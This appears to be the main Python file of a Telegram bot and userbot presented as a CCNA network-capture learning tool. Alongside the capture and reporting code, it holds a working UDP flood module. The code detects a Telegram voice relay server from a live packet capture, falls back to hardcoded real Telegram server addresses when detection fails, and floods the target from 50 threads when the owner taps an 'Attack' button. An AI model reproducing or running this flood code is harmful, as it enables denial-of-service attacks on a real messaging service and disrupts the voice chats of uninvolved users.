"""
main.py — TG_NETWORK_capturer + Attack Module (FULL IPv4 + IPv6)
════════════════════════════════════════════════════════════════════════
Telegram bot + userbot combo for CCNA learners.
Auto‑detects real IPv4 OR IPv6 voice server from the pcap file
AFTER the first mic unmute to ensure voice packets are present.
"""

import asyncio
import os
import html
import json
import signal
import threading
import time
import socket
import random
import subprocess
import re
from collections import Counter
from datetime import datetime

from dotenv import load_dotenv
from pyrogram import Client
from pyrogram.raw import functions as tl_functions
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
)

from network_analyzer import NetworkCapture
from voice_chat_handler import VoiceChatHandler

load_dotenv()

# ─── Config ───────────────────────────────────────────────────────────────────────
API_ID         = int(os.getenv("API_ID", "0"))
API_HASH       = os.getenv("API_HASH", "")
STRING_SESSION = os.getenv("STRING_SESSION", "")
BOT_TOKEN      = os.getenv("BOT_TOKEN", "")
OWNER_ID       = int(os.getenv("OWNER_ID", "0"))
TEST_DURATION  = int(os.getenv("TEST_DURATION", "60"))

# Attack defaults
ATTACK_THREADS      = 50
ATTACK_PACKET_SIZE  = 204
ATTACK_DELAY        = 0.06

# Real Telegram voice/STUN ports (UDP)
TELEGRAM_VOICE_PORTS = [1400, 3478, 596, 597, 598, 599]

# Local/private IP prefixes to exclude from voice-server detection
_LOCAL_PREFIXES = ("127.", "10.", "192.168.", "::1", "fe80", "169.254.")

# ─── Pyrogram userbot ───────────────────────────────────────────────────────────
userbot = Client(
    name="tg_capturer",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=STRING_SESSION,
)

# ─── Global state ──────────────────────────────────────────────────────────────
voice_chat_handler: VoiceChatHandler | None            = None
voice_chats_cache:  dict[str, dict]                    = {}
active_captures:    dict[int, NetworkCapture]          = {}
attack_threads:     dict[int, list[threading.Thread]]  = {}
attack_running:     dict[int, bool]                    = {}
attack_targets:     dict[int, tuple[str, int]]         = {}


# ════════════════════════════════════════════════════════════════════════
# IPv6 helper
# ════════════════════════════════════════════════════════════════════════

def is_ipv6(addr: str) -> bool:
    return ":" in addr


def make_udp_socket(target_ip: str) -> socket.socket:
    family = socket.AF_INET6 if is_ipv6(target_ip) else socket.AF_INET
    sock   = socket.socket(family, socket.SOCK_DGRAM)
    if family == socket.AF_INET6:
        try:
            sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        except (AttributeError, OSError):
            pass
    return sock


def _is_local_ip(ip: str) -> bool:
    if any(ip.startswith(p) for p in _LOCAL_PREFIXES):
        return True
    if ip.startswith("172."):
        try:
            second_octet = int(ip.split(".")[1])
            if 16 <= second_octet <= 31:
                return True
        except (IndexError, ValueError):
            pass
    return False


# ════════════════════════════════════════════════════════════════════════
# Extract voice server from pcap — 3-strategy, real Telegram ports
# ════════════════════════════════════════════════════════════════════════

def extract_voice_server_from_pcap(pcap_path: str) -> tuple[str, int] | None:
    """
    Identify the Telegram voice relay server from a pcap using three strategies:

    Strategy 1 — STUN packets (ports 1400 and 3478)
      STUN is used for NAT traversal; the server that replies to STUN
      IS the voice relay. This is the most reliable indicator.

    Strategy 2 — Known Telegram voice ports (596, 597, 598, 599)
      Telegram encrypted voice media uses these UDP ports.

    Strategy 3 — Most active UDP destination
      Count all non-local UDP destinations and pick the busiest one.
      Whatever server receives the most packets during a voice call
      is the voice relay.

    IPv6 is preferred over IPv4 when both appear in the same packet.
    """
    if not pcap_path or not os.path.exists(pcap_path):
        print("⚠️  No pcap file available.")
        return None

    def _run_tshark(display_filter: str, count: int = 1) -> str | None:
        cmd = [
            "tshark", "-r", pcap_path,
            "-Y", display_filter,
            "-T", "fields",
            "-E", "separator=|",
            "-e", "ip.dst",
            "-e", "ipv6.dst",
            "-e", "udp.dstport",
        ]
        if count > 0:
            cmd += ["-c", str(count)]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
        except subprocess.TimeoutExpired:
            print(f"⚠️  tshark timed out for filter: {display_filter}")
        except FileNotFoundError:
            print("⚠️  tshark not found. Install: sudo apt install tshark -y")
        except Exception as e:
            print(f"⚠️  tshark error: {e}")
        return None

    def _parse_first_line(output: str) -> tuple[str, int] | None:
        line  = output.splitlines()[0]
        parts = line.split("|")
        if len(parts) >= 3:
            ipv4_dst, ipv6_dst, port_str = parts[0].strip(), parts[1].strip(), parts[2].strip()
            ip = ipv6_dst if ipv6_dst else ipv4_dst
            if ip and port_str.isdigit() and not _is_local_ip(ip):
                return (ip, int(port_str))
        return None

    # ── Strategy 1: STUN ports ─────────────────────────────────────────────────────
    for stun_port in [1400, 3478]:
        out = _run_tshark(f"udp.dstport == {stun_port}", count=1)
        if out:
            result = _parse_first_line(out)
            if result:
                proto = "IPv6" if is_ipv6(result[0]) else "IPv4"
                print(f"✅ Voice server via STUN:{stun_port} ({proto}): {result[0]}:{result[1]}")
                return result

    # ── Strategy 2: Known Telegram voice ports ───────────────────────────────────
    for tg_port in [596, 597, 598, 599]:
        out = _run_tshark(f"udp.dstport == {tg_port}", count=1)
        if out:
            result = _parse_first_line(out)
            if result:
                proto = "IPv6" if is_ipv6(result[0]) else "IPv4"
                print(f"✅ Voice server via TG-voice-port:{tg_port} ({proto}): {result[0]}:{result[1]}")
                return result

    # ── Strategy 3: Most active UDP destination (fallback) ───────────────────────
    out = _run_tshark(
        "udp && !udp.port == 53 && !udp.port == 123 && !udp.port == 67 && !udp.port == 68",
        count=0,
    )
    if out:
        counter: Counter = Counter()
        for line in out.splitlines():
            parts = line.split("|")
            if len(parts) >= 3:
                ipv4_dst, ipv6_dst, port_str = parts[0].strip(), parts[1].strip(), parts[2].strip()
                ip = ipv6_dst if ipv6_dst else ipv4_dst
                if ip and port_str.isdigit() and not _is_local_ip(ip):
                    counter[(ip, int(port_str))] += 1
        if counter:
            (ip, port), count = counter.most_common(1)[0]
            proto = "IPv6" if is_ipv6(ip) else "IPv4"
            print(f"✅ Voice server via most-active UDP ({proto}, {count} pkts): {ip}:{port}")
            return (ip, port)

    print("⚠️  Could not detect voice server from pcap (no matching UDP traffic yet).")
    return None


# ════════════════════════════════════════════════════════════════════════
# Attack Engine — IPv4 AND IPv6 support
# ════════════════════════════════════════════════════════════════════════

def udp_flood(target_ip: str, target_port: int, stop_flag: callable, thread_id: int):
    try:
        sock   = make_udp_socket(target_ip)
        packet = bytes([random.randint(0, 255) for _ in range(ATTACK_PACKET_SIZE)])
        dest   = (target_ip, target_port, 0, 0) if is_ipv6(target_ip) else (target_ip, target_port)
        while not stop_flag():
            try:
                sock.sendto(packet, dest)
            except Exception:
                pass
            time.sleep(ATTACK_DELAY)
        sock.close()
    except Exception as e:
        print(f"[thread-{thread_id}] flood error: {e}")


def start_attack(uid: int, target_ip: str, target_port: int, num_threads: int = ATTACK_THREADS):
    if uid in attack_running and attack_running[uid]:
        return False
    attack_running[uid] = True
    threads = []
    proto = "IPv6" if is_ipv6(target_ip) else "IPv4"
    print(f"⚔️  Starting {proto} UDP flood → {target_ip}:{target_port} with {num_threads} threads")
    for i in range(num_threads):
        t = threading.Thread(
            target=udp_flood,
            args=(target_ip, target_port,
                  lambda: not attack_running.get(uid, False), i),
            daemon=True,
        )
        t.start()
        threads.append(t)
    attack_threads[uid] = threads
    return True


def stop_attack(uid: int):
    attack_running[uid] = False
    if uid in attack_threads:
        for t in attack_threads[uid]:
            t.join(timeout=1)
        del attack_threads[uid]


# ════════════════════════════════════════════════════════════════════════
# Voice chat scanner
# ════════════════════════════════════════════════════════════════════════

async def find_active_voice_chats() -> list[dict]:
    active = []
    async for dialog in userbot.get_dialogs():
        chat = dialog.chat
        if chat.type.value not in ("group", "supergroup", "channel"):
            continue
        try:
            peer = await userbot.resolve_peer(chat.id)
            try:
                full = await userbot.invoke(
                    tl_functions.channels.GetFullChannel(channel=peer)
                )
                if getattr(full.full_chat, "call", None):
                    active.append({
                        "id":       chat.id,
                        "title":    chat.title or "Untitled",
                        "type":     chat.type.value,
                        "username": chat.username or "",
                    })
                    continue
            except Exception:
                pass
            try:
                full = await userbot.invoke(
                    tl_functions.messages.GetFullChat(chat_id=abs(chat.id))
                )
                if getattr(full.full_chat, "call", None):
                    active.append({
                        "id":       chat.id,
                        "title":    chat.title or "Untitled",
                        "type":     chat.type.value,
                        "username": chat.username or "",
                    })
            except Exception:
                pass
        except Exception:
            continue
    return active


# ════════════════════════════════════════════════════════════════════════
# Report formatter
# ════════════════════════════════════════════════════════════════════════

def format_summary(vc_info: dict, r: dict) -> str:
    SEP = "═" * 35
    dc_lines = (
        "\n".join(f"  • <code>{ip}</code> → {dc}" for ip, dc in r["dc_connections"].items())
        or "  • ⚠️ No direct TG DC detected (VPN/proxy?)"
    )
    total = sum(r["protocols"].values()) or 1
    proto_lines = "\n".join(
        f"  • <b>{p}</b>: {c} ({c/total*100:.0f}%)"
        for p, c in sorted(r["protocols"].items(), key=lambda x: -x[1])
    ) or "  • None"
    top_app = sorted(r["port_protocols"].items(), key=lambda x: -x[1])[:5]
    app_lines = "\n".join(f"  • <code>{p}</code> → {c}" for p, c in top_app) or "  • None"
    ev_lines = "\n".join(
        f"  • <code>[{datetime.fromtimestamp(e['timestamp']).strftime('%H:%M:%S')}]</code>"
        f" +{e['timestamp']-r['start_time']:.0f}s — {e['event']}"
        for e in r["events"][-10:]
    ) or "  • None"
    return f"""
📡 <b>Network Capture Report</b>
🎤 Voice Chat: <b>{html.escape(vc_info['title'])}</b>  <code>({vc_info['type']})</code>
{SEP}
📊 <b>Bandwidth</b>
  • Duration      : <code>{r['duration']:.1f} s</code>
  • Total Data    : <code>{r['total_bytes']/1024:.2f} KB</code>
  • ↑ Upload      : <code>{r['bytes_sent']/1024:.2f} KB</code>
  • ↓ Download    : <code>{r['bytes_recv']/1024:.2f} KB</code>
  • Avg Bandwidth : <code>{r['bandwidth_kbps']:.2f} Kbps</code>
  • ↑ Peak Upload : <code>{r['peak_kbps_up']:.1f} Kbps</code>
  • ↓ Peak Down   : <code>{r['peak_kbps_dn']:.1f} Kbps</code>
  • Total Packets : <code>{r['total_packets']}</code>
  • Avg PPS       : <code>{r['avg_pps']:.1f}</code> pkt/s
{SEP}
🏢 <b>Telegram Data Centers</b>
{dc_lines}
{SEP}
🔌 <b>Transport Layer</b> (TCP vs UDP)
{proto_lines}
{SEP}
🌐 <b>App-Layer Protocols</b> (by port)
{app_lines}
{SEP}
📅 <b>Event Timeline</b>
{ev_lines}
{SEP}
📚 <b>CCNA Quick Notes</b>
  • <b>TCP</b> → 3-way handshake, reliable
  • <b>UDP</b> → No handshake, low latency (voice ↑ PPS when mic ON)
  • <b>TLS/443</b> → MTProto encrypted inside
  • <b>STUN/3478 or 1400</b> → NAT traversal for UDP voice
  • <b>UDP 596-599</b> → Telegram encrypted voice media ports
  • <b>TIME_WAIT</b> → Normal TCP close state (2×MSL)
  • <b>Ephemeral ports</b> → Client ports assigned by OS (>49152)
  • <b>IPv6</b> → Attack engine auto-selects AF_INET6 when target has colon in IP
""".strip()


def build_vc_keyboard(vcs: list[dict]) -> tuple[dict, InlineKeyboardMarkup]:
    cache, rows = {}, []
    for i, vc in enumerate(vcs):
        key = str(i)
        cache[key] = vc
        rows.append([InlineKeyboardButton(
            f"🎤 {vc['title'][:28]}  ({vc['type']})",
            callback_data=f"vc_{key}",
        )])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
    return cache, InlineKeyboardMarkup(rows)


# ════════════════════════════════════════════════════════════════════════
# Bot handlers
# ════════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    msg = await update.message.reply_text(
        "🔍 Scanning all dialogs for active voice chats…\n"
        "_(May take a few seconds for accounts in many groups.)_",
        parse_mode="HTML",
    )
    try:
        vcs = await find_active_voice_chats()
    except Exception as e:
        await msg.edit_text(f"❌ Scan error:\n<code>{e}</code>", parse_mode="HTML")
        return
    if not vcs:
        await msg.edit_text(
            "❌ No active voice chats found.\n"
            "Make sure your account is in a group/channel with an ongoing voice chat."
        )
        return
    global voice_chats_cache
    voice_chats_cache, markup = build_vc_keyboard(vcs)
    await msg.edit_text(
        f"✅ Found <b>{len(vcs)}</b> active voice chat(s).\nTap one to start:",
        reply_markup=markup,
        parse_mode="HTML",
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    await update.message.reply_text(
        "🤖 <b>TG Network Capturer — Linux Edition</b>\n\n"
        "<b>Commands:</b>\n"
        "• <code>/start</code> — scan for active voice chats\n"
        "• <code>/help</code>  — show this\n\n"
        "<b>Voice server detection (3 strategies):</b>\n"
        "1. STUN packets on port 1400 or 3478\n"
        "2. Telegram voice ports 596/597/598/599\n"
        "3. Most active UDP destination in the pcap\n\n"
        "<b>Automated test sequence:</b>\n"
        "1. Join voice chat (silent)\n"
        "2. Unmute mic × 3  →  see UDP PPS spike!\n"
        "3. Leave  →  see TIME_WAIT TCP state\n"
        "4. Rejoin →  see new handshake + DC IP\n"
        "5. Tap <b>Stop</b> → receive full report + .pcap + JSON\n\n"
        "✅ Linux — uses tcpdump for capture and tshark for analysis",
        parse_mode="HTML",
    )


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if update.effective_user.id != OWNER_ID:
        return

    data = query.data

    if data == "refresh":
        await query.edit_message_text("🔍 Refreshing…")
        try:
            vcs = await find_active_voice_chats()
        except Exception as e:
            await query.edit_message_text(f"❌ Error:\n<code>{e}</code>", parse_mode="HTML")
            return
        if not vcs:
            await query.edit_message_text("❌ No active voice chats found.")
            return
        global voice_chats_cache
        voice_chats_cache, markup = build_vc_keyboard(vcs)
        await query.edit_message_text(
            f"✅ Found <b>{len(vcs)}</b> active voice chat(s):",
            reply_markup=markup,
            parse_mode="HTML",
        )
        return

    if data.startswith("vc_"):
        idx     = data[3:]
        vc_info = voice_chats_cache.get(idx)
        if not vc_info:
            await query.edit_message_text("❌ Cache expired — use /start again.")
            return
        await query.edit_message_text(
            f"🎤 <b>{html.escape(vc_info['title'])}</b>\n\n"
            f"⏳ Starting automated test…\n"
            f"🔬 Network monitoring <b>active</b>\n\n"
            f"Steps: join → mic×3 → leave → rejoin",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⏹️ Stop Capture", callback_data=f"close_{idx}")],
                [InlineKeyboardButton("⚔️ Attack",       callback_data=f"attack_{idx}")],
                [InlineKeyboardButton("🛑 Stop Attack",  callback_data="stop_attack")]
            ]),
            parse_mode="HTML",
        )
        asyncio.create_task(_run_test(vc_info, context, idx))
        return

    if data.startswith("attack_"):
        idx     = data[7:]
        vc_info = voice_chats_cache.get(idx)
        if not vc_info:
            await query.edit_message_text("❌ No active capture found.")
            return
        target = attack_targets.get(OWNER_ID)
        if not target:
            await query.edit_message_text("❌ No target server info. Did the join succeed?")
            return
        ip, port = target
        proto    = "IPv6" if is_ipv6(ip) else "IPv4"
        if start_attack(OWNER_ID, ip, port):
            await query.edit_message_text(
                f"⚔️ <b>Attack started</b>\n"
                f"Target  : <code>{ip}:{port}</code>  [{proto}]\n"
                f"Threads : {ATTACK_THREADS}\n"
                f"Pkt size: {ATTACK_PACKET_SIZE} bytes\n"
                f"Delay   : {ATTACK_DELAY}s",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⏹️ Stop Capture", callback_data=f"close_{idx}")],
                    [InlineKeyboardButton("🛑 Stop Attack",  callback_data="stop_attack")]
                ]),
                parse_mode="HTML",
            )
        else:
            await query.edit_message_text("⚠️ Attack already running.")
        return

    if data == "stop_attack":
        stop_attack(OWNER_ID)
        await query.edit_message_text("🛑 Attack stopped. Capture continues.")
        return

    if data.startswith("close_"):
        idx     = data[6:]
        vc_info = voice_chats_cache.get(idx)
        if not vc_info:
            await query.edit_message_text("❌ No active test found.")
            return
        await query.edit_message_text("⏹️ Stopping capture…\n📊 Generating report, please wait.")
        asyncio.create_task(_finalize(vc_info, context, OWNER_ID))


# ════════════════════════════════════════════════════════════════════════
# Background test sequence
# ════════════════════════════════════════════════════════════════════════

async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str):
    chat_id = vc_info["id"]
    capture = NetworkCapture(duration=TEST_DURATION, capture_packets=True)
    active_captures[OWNER_ID] = capture

    try:
        loop         = asyncio.get_event_loop()
        capture_task = loop.run_in_executor(None, capture.start_capture)

        await context.bot.send_message(
            OWNER_ID,
            f"▶️ <b>Test started</b> for <b>{html.escape(vc_info['title'])}</b>\n"
            f"🔬 Network monitoring running…",
            parse_mode="HTML",
        )

        await voice_chat_handler.join_voice_chat(chat_id)
        capture.log_event("voice_chat_joined", vc_info["title"])
        await asyncio.sleep(2)

        await voice_chat_handler.toggle_mic(chat_id, muted=False)
        capture.log_event("mic_unmuted", "Cycle 1/3 — voice server detection window")
        await asyncio.sleep(4)

        pcap_file = capture.get_pcap_file()
        target    = extract_voice_server_from_pcap(pcap_file) if pcap_file else None

        if target:
            server_ip, server_port = target
            proto = "IPv6" if is_ipv6(server_ip) else "IPv4"
            attack_targets[OWNER_ID] = target
            await context.bot.send_message(
                OWNER_ID,
                f"✅ <b>Voice server detected [{proto}]</b>\n"
                f"<code>{server_ip}:{server_port}</code>\n"
                f"Attack button is now armed 🎯",
                parse_mode="HTML",
            )
        else:
            fallback_ipv6 = "2001:b28:f23d:f001::e"
            fallback_ipv4 = "149.154.167.51"
            fallback_port = 597
            try:
                test_sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
                test_sock.connect(("2001:4860:4860::8888", 80))
                fallback_ip = fallback_ipv6
                test_sock.close()
            except Exception:
                fallback_ip = fallback_ipv4
            attack_targets[OWNER_ID] = (fallback_ip, fallback_port)
            proto = "IPv6" if is_ipv6(fallback_ip) else "IPv4"
            await context.bot.send_message(
                OWNER_ID,
                f"⚠️ Could not detect voice server from pcap.\n"
                f"Falling back to {proto}: <code>{fallback_ip}:{fallback_port}</code>\n"
                f"<i>Tip: Make sure tshark is installed and tcpdump ran as root.</i>",
                parse_mode="HTML",
            )

        await voice_chat_handler.toggle_mic(chat_id, muted=True)
        capture.log_event("mic_muted", "Cycle 1/3")
        await asyncio.sleep(3)

        await voice_chat_handler.toggle_mic(chat_id, muted=False)
        capture.log_event("mic_unmuted", "Cycle 2/3")
        await asyncio.sleep(4)
        await voice_chat_handler.toggle_mic(chat_id, muted=True)
        capture.log_event("mic_muted", "Cycle 2/3")
        await asyncio.sleep(3)

        await voice_chat_handler.toggle_mic(chat_id, muted=False)
        capture.log_event("mic_unmuted", "Cycle 3/3")
        await asyncio.sleep(4)
        await voice_chat_handler.toggle_mic(chat_id, muted=True)
        capture.log_event("mic_muted", "Cycle 3/3")
        await asyncio.sleep(3)

        await context.bot.send_message(
            OWNER_ID,
            "✅ Step 2/4 — Mic toggle cycles complete\n"
            "(PPS spikes visible in the report when mic was ON)",
        )

        await voice_chat_handler.leave_voice_chat(chat_id)
        capture.log_event("voice_chat_left", "TCP FIN sent → TIME_WAIT expected")
        await asyncio.sleep(5)
        await context.bot.send_message(
            OWNER_ID,
            "✅ Step 3/4 — Left voice chat\n"
            "(Watch for TIME_WAIT connections in the report)",
        )

        await voice_chat_handler.join_voice_chat(chat_id)
        capture.log_event("voice_chat_rejoined", "New TCP handshake + DC IP")
        await asyncio.sleep(3)
        await context.bot.send_message(
            OWNER_ID,
            "✅ Step 4/4 — Rejoined voice chat\n\n"
            "🟢 <b>Sequence complete!</b> Monitoring still running.\n"
            "Use the buttons to start an attack or stop capture.",
            parse_mode="HTML",
        )

        await capture_task

    except Exception as exc:
        capture.stop_capture()
        await context.bot.send_message(
            OWNER_ID,
            f"❌ Test error:\n<code>{exc}</code>\n\nTap <b>Stop Capture</b> to get a partial report.",
            parse_mode="HTML",
        )
        try:
            await voice_chat_handler.leave_voice_chat(chat_id)
        except Exception:
            pass


async def _finalize(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    chat_id = vc_info["id"]
    capture = active_captures.get(user_id)
    if not capture:
        await context.bot.send_message(user_id, "❌ No active capture found.")
        return
    try:
        capture.stop_capture()
        try:
            await voice_chat_handler.leave_voice_chat(chat_id)
        except Exception:
            pass
        stop_attack(user_id)

        report_data = capture.get_report()
        summary     = format_summary(vc_info, report_data)

        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_title = vc_info["title"][:20].replace(" ", "_").replace("/", "-")
        filename   = f"tg_capture_{safe_title}_{ts}.txt"
        capture.export_to_file(filename)

        for chunk in [summary[i:i+4096] for i in range(0, len(summary), 4096)]:
            await context.bot.send_message(user_id, chunk, parse_mode="HTML")

        with open(filename, "rb") as fh:
            await context.bot.send_document(
                user_id, document=fh, filename=filename,
                caption=(
                    f"📄 Full capture: <b>{html.escape(vc_info['title'])}</b>\n"
                    f"Bandwidth timeline, all connection snapshots, DC IPs, CCNA notes."
                ),
                parse_mode="HTML",
            )
        os.remove(filename)

        json_filename = f"analysis_{safe_title}_{ts}.json"
        capture.export_analysis_json(json_filename)
        with open(json_filename, "rb") as f:
            await context.bot.send_document(
                user_id, document=f, filename=json_filename,
                caption="📊 Detailed capture analysis (connections, DCs, bandwidth series).",
            )
        os.remove(json_filename)

        pcap_file = capture.get_pcap_file()
        if pcap_file and os.path.exists(pcap_file):
            with open(pcap_file, "rb") as f:
                await context.bot.send_document(
                    user_id, document=f,
                    filename=os.path.basename(pcap_file),
                    caption=f"📦 Raw UDP pcap for {html.escape(vc_info['title'])}.\nOpen in Wireshark to inspect voice packets."
                )
            os.remove(pcap_file)

        del active_captures[user_id]
        await context.bot.send_message(
            user_id, "✅ Done! All files sent.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Scan again", callback_data="refresh")]]),
        )
    except Exception as exc:
        await context.bot.send_message(user_id, f"❌ Report error:\n<code>{exc}</code>", parse_mode="HTML")


# ════════════════════════════════════════════════════════════════════════
# Entry point
# ════════════════════════════════════════════════════════════════════════

async def main():
    global voice_chat_handler

    print("═" * 60)
    print("  TG_NETWORK_capturer — Starting up (IPv4 + IPv6 Edition)")
    print("═" * 60)

    missing = [k for k, v in {
        "API_ID": API_ID, "API_HASH": API_HASH,
        "STRING_SESSION": STRING_SESSION,
        "BOT_TOKEN": BOT_TOKEN, "OWNER_ID": OWNER_ID,
    }.items() if not v]

    if missing:
        print(f"❌ Missing config values: {', '.join(missing)}")
        print("   Check your .env file and run generate_session.py if needed.")
        return

    await userbot.start()
    me = await userbot.get_me()
    print(f"✅ Userbot started  → @{me.username}  (id: {me.id})")

    voice_chat_handler = VoiceChatHandler(userbot)
    await voice_chat_handler.start()
    print("✅ Voice chat handler ready")

    # ── Bot API with increased timeouts to avoid ReadTimeout on startup ─────────
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(30)
        .pool_timeout(30)
        .build()
    )
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CommandHandler("help",  cmd_help))
    application.add_handler(CallbackQueryHandler(callback_handler))

    print(f"✅ Bot running — send /start to your bot in Telegram")
    print(f"   Test duration: {TEST_DURATION}s")
    print("═" * 60)

    # ── Graceful shutdown via OS signals ─────────────────────────────────────
    # Previously: asyncio.Event().wait() was cancelled by Ctrl+C before
    # application.updater.stop() / application.stop() could run, causing:
    #   RuntimeError: This Application is still running!
    # Fix: use a signal-set Event so shutdown runs cleanly inside try/finally.
    loop       = asyncio.get_event_loop()
    stop_event = asyncio.Event()

    def _on_signal():
        print("\n🛑 Shutdown signal received…")
        stop_event.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _on_signal)
        except NotImplementedError:
            pass  # Windows fallback: Ctrl+C will be caught by asyncio naturally

    async with application:
        await application.start()
        await application.updater.start_polling(drop_pending_updates=True)
        print("Polling started — press Ctrl+C to stop")
        try:
            await stop_event.wait()          # blocks until Ctrl+C / SIGTERM
        finally:
            # Always runs — ensures clean shutdown even on unexpected exceptions
            print("🛑 Stopping attack threads…")
            stop_attack(OWNER_ID)
            print("🛑 Stopping bot polling…")
            await application.updater.stop()
            await application.stop()

    await userbot.stop()
    print("✅ Shutdown complete.")


if __name__ == "__main__":
    asyncio.run(main())
